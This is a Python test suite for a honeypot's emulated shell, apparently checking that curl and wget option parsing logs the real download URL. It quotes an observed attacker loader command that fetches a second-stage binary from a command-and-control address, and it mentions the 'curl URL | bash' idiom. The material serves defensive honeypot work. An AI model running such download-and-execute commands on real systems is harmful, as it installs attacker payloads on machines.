#!/usr/bin/env python3
"""Which argument is the URL? `-Lko .16 URL` fetched the filename.

The emulator and real curl gave different answers, and the difference cost
us live intelligence. On 2026-09-15 at 18:44 UTC, 203.0.113.75 ran:

    curl -Lko .16 --retry 3 --retry-delay 3 --retry-connrefused \\
         http://203.0.113.81/f/brute/m/.16_$(uname -m)

and the honeypot logged:

    {"event": "download", "url": ".16", "captured": false}

`.16` is the *output filename*. `_positional()` compared whole argv tokens
against the table of value-taking options, so it never saw that the cluster
`-Lko` ends in an argument-taking `-o`; `.16` fell through as a positional,
and cmd_curl's "has a dot" filter preferred it to the real URL.

Two costs, both measured in production:

  * The C2 address was thrown away. 38 of 184 download events recorded a
    non-URL, 36 of them the literal `.16`, spread evenly across
    203.0.113.75, 203.0.113.34 and 203.0.113.48 -- twelve each, one
    campaign. We know 203.0.113.81 only because it survived in the raw
    command text that the reader ignored.
  * The second stage was never delivered. The synthetic body went into the
    file `.16`, the loader executed it, and got

        bash: !DOCTYPE: No such file or directory
        bash: html><head><title>.16</title></head>: No such file or directory

    three times before giving up. Note the title: a page named after the
    wrong URL. No real box emits that.

Ground truth, from curl 8.14.1 in a debian:trixie container:

    $ curl -Lko .16 -w '%{url_effective}\\n' http://192.0.2.1/f/brute/m/.16_x86_64
    url_effective=http://192.0.2.1/f/brute/m/.16_x86_64

    -o writes the body to the file and leaves stdout empty; without -o the
    body goes to stdout. `curl --help all` confirms which long options take
    a value: --retry-delay, --retry-max-time, --limit-rate, --max-redirs and
    --output-dir do; --retry-connrefused, --retry-all-errors, -k and -L
    do not.

This is the third time the same bug class has been fixed here. The table of
value-taking options was added because `wget -T 30 URL` fetched `30`; the
"://" filter was added because a mis-parsed flag could redirect a fetch.
Both readers were still blind to clusters.

The end-to-end checks drive `cmd_curl` through `Shell.run` and read the
`download` event the emulator actually logs. An earlier draft of this file
computed the expected URL with its own copy of the selection rule, which
passed against the broken tree -- a test encoding the fix beside the code
proves nothing.

Usage:  python3 curlargtest.py
"""

import sys

import fakeshell as fs

CHECKS, FAILS = [], []

U = "http://203.0.113.81/f/brute/m/.16_x86_64"


def check(name, got, want, note=""):
    ok = got == want
    CHECKS.append(ok)
    if not ok:
        FAILS.append("FAIL %s\n  got  %r\n  want %r%s"
                     % (name, got, want, "\n  -- " + note if note else ""))


def positional(argv, opts):
    """The positionals, or [] on a build where the call is gone.

    Guarded rather than indexed: a suite that raises against the broken
    tree reports a traceback instead of the failures it was written to find.
    """
    fn = getattr(fs.Shell, "_positional", None)
    if fn is None:
        return []
    try:
        return list(fn(argv, opts))
    except Exception:                                          # noqa: BLE001
        return []


def drive(cmdline, readback=None):
    """Run a command line in a fresh shell and report what it did.

    Returns (stdout, rc, [download urls], readback bytes or None). Nothing
    is executed and nothing leaves the host: _fetch synthesises a body and
    the capture is out-of-band, which is why `captured` is False here.
    """
    try:
        sh = fs.Shell(fs.VFS())
        sh.exec_mode = True
        seen = []
        sh.log = lambda **kw: seen.append(kw)
        out = sh.run(cmdline)
        dl = [e for e in seen if e.get("event") == "download"]
        urls = [e.get("url") for e in dl]
        drive.captured = [e.get("captured") for e in dl]
        blob = None
        if readback is not None:
            try:
                blob = sh.fs.read(fs.VFS.norm(readback, sh.cwd))
            except Exception:                                  # noqa: BLE001
                blob = None
        return out, sh.last_rc, urls, blob
    except Exception as exc:                                   # noqa: BLE001
        drive.captured = []
        return "<%s>" % exc, None, [], None


C = fs.Shell._CURL_VALUE_OPTS
W = fs.Shell._WGET_VALUE_OPTS

# ==================================================== the production command
PROD = ('curl -Lko .16 --retry 3 --retry-delay 3 --retry-connrefused ' + U)
out, rc, urls, blob = drive(PROD, readback=".16")

check("the command that lost a C2 address now records the C2 address",
      urls[:1], [U],
      "production logged url: \".16\" -- 36 times across three addresses")
check("every retry records it, not just the first",
      sorted(set(urls)), [U],
      "--retry 3 means four download events; all four were \".16\"")
check("no other token is recorded as a URL alongside it",
      [e for e in urls if e != U], [],
      "the filename and the retry delay are not fetch candidates")
check("and the honeypot still fetches nothing on the attacker's behalf",
      set(drive.captured), {False},
      "the URL is recorded for intel; the bytes are never requested. This "
      "is the hard rule the whole fetch path exists to keep, so it is "
      "asserted here rather than assumed")
check("-o keeps stdout empty, as real curl does",
      out, "",
      "the body belongs in the file; this part was always right")
check("the output file is not an HTML page named after the wrong URL",
      (blob or b"")[:9] != b"<!DOCTYPE", True,
      "an HTML doctype in a file the loader execs is what made it give up")
check("the output file looks like what the URL promised",
      (blob or b"")[:4], b"\x7fELF",
      "the basename is .16_x86_64, so a binary is the plausible answer")

# --------------------------------- and the parse underneath, on its own terms
PARGV = ["-Lko", ".16", "--retry", "3", "--retry-delay", "3",
         "--retry-connrefused", U]
check("the output filename is not a positional at all",
      ".16" in positional(PARGV, C), False,
      "-o's value is a filename; it must never be a fetch candidate")
check("--retry-delay's value does not leak either",
      "3" in positional(PARGV, C), False,
      "harmless only because \"3\" has no dot -- a latent second bug")

# ======================================================= getopt's own rules
for argv, why in (
        (["-Lko", ".16"], "value in the next argument"),
        (["-Lko.16"], "value attached to the cluster"),
        (["-o", ".16"], "the plain form, which always worked"),
        (["-oLk"], "at the first value-taking letter the rest is the value, "
                   "so this is -o with the value \"Lk\""),
        (["-sSL"], "no value-taking letter: consume nothing"),
        (["-X", "POST"], "whole-token match, unchanged"),
        (["--output=/tmp/x"], "the = form must not eat the next arg"),
        (["--retry-delay", "3"], "long option with a value"),
        (["-k", "--limit-rate", "200k"], "newly tabled long option"),
        (["--max-redirs", "5"], "newly tabled long option"),
):
    _o, _rc, got, _b = drive("curl " + " ".join(argv) + " " + U)
    check("curl %s" % " ".join(argv), got[:1], [U], why)

# wget shares _positional, so the fix lands on both readers.
for argv, why in (
        (["-qO-"], "the commonest loader idiom there is"),
        (["-qO", "-"], "...and its spaced form"),
        (["-qO", ".16"], "the same trap as curl's -Lko"),
        (["-T", "30"], "the bug this table was created for"),
        (["--tries=3"], "the = form"),
):
    _o, _rc, got, _b = drive("wget " + " ".join(argv) + " " + U)
    check("wget %s" % " ".join(argv), got[:1], [U], why)

# ================================== survivable input and the scheme fallback
check("a value-taking flag with nothing after it is survivable",
      positional(["-o"], C), [],
      "truncated command lines arrive from broken loaders all the time")

def events_of(cmdline):
    """Event names logged by a command line, plus its rc."""
    try:
        sh = fs.Shell(fs.VFS())
        sh.exec_mode = True
        seen = []
        sh.log = lambda **kw: seen.append(kw)
        sh.run(cmdline)
        return [e.get("event") for e in seen], sh.last_rc
    except Exception as exc:                                   # noqa: BLE001
        return ["<%s>" % exc], None


# A scheme-less URL is real traffic and curl accepts it, so the dotted-token
# fallback has to stay. ipinfo.io is answered from the persona as an address
# echo -- there is no payload to fetch -- so the signal is the probe event
# and rc 0, not a download event.
evs, rc = events_of("curl -s ipinfo.io/org")
check("scheme-less but dotted is still recognised as a URL",
      ("ip_echo_probe" in evs, rc), (True, 0),
      "dropping the fallback would make this the usage error below")
evs, rc = events_of("curl -s")
check("...while a command line with no URL at all is still a usage error",
      rc, 2,
      "the fallback must not turn every bare flag into a fetch")

_o, _rc, got, _b = drive("curl -o x.bin " + U)
check("a scheme beats a dot when both are present", got[:1], [U])

_o, _rc, _u, _b = drive("curl -s " + U)
check("with no -o the body still goes to stdout",
      _o[:4], "\x7fELF",
      "`curl URL | bash` is the whole point; -o must not be assumed")

# ===================================== the two readers now agree with each other
# Every single-letter entry in either table must be reachable by the cluster
# walk, or the table and the walk disagree again the moment one is edited.
for label, table in (("curl", C), ("wget", W)):
    letters = sorted(x for x in table
                     if len(x) == 2 and x[0] == "-" and x[1].isalpha())
    unreachable = [opt for opt in letters
                   if positional(["-" + opt[1], "VALUE", U], table) != [U]]
    check("%s: every short value-option consumes its argument" % label,
          unreachable, [],
          "the table and the parser are two readers of one question")

print("%d checks, %d failed" % (len(CHECKS), len(FAILS)))
for f in FAILS:
    print(f)
sys.exit(1 if FAILS else 0)
